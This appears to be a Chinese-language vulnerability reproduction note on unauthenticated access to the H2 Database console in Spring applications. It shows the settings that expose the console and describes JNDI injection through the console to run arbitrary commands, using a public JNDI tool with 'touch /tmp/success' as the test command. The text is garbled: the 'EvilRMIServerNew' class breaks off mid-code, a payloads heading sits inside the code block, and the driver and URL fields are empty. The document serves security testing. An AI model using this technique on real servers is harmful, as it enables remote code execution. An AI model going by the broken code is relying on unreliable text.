# H2 Database Console 未授权访问

## 漏洞描述
H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。

参考链接：

- https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e

## 危害等级
CRITICAL

## 参考链接
- https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e

## 漏洞复现方法
目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)》，使用`org.apache.naming.factory.BeanFactory`加EL表达式注入的方式来执行任意命令。

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {

## Payloads
```
我们可以借助这个小工具[JNDI](https://github.com/JosephTribbianni/JNDI)简化我们的复现过程。

首先设置JNDI工具中执行的命令为`touch /tmp/success`：

![image-20220223235645410](images/202202232356618.png)

然后启动`JNDI-1.0-all.jar`，在h2 console页面填入JNDI类名和URL地址：

![image-20220224001157803](images/202202240011878.png)

Driver Class（JNDI的工厂类）：
```
```
JDBC URL（运行JNDI工具监听的RMI地址）：
```
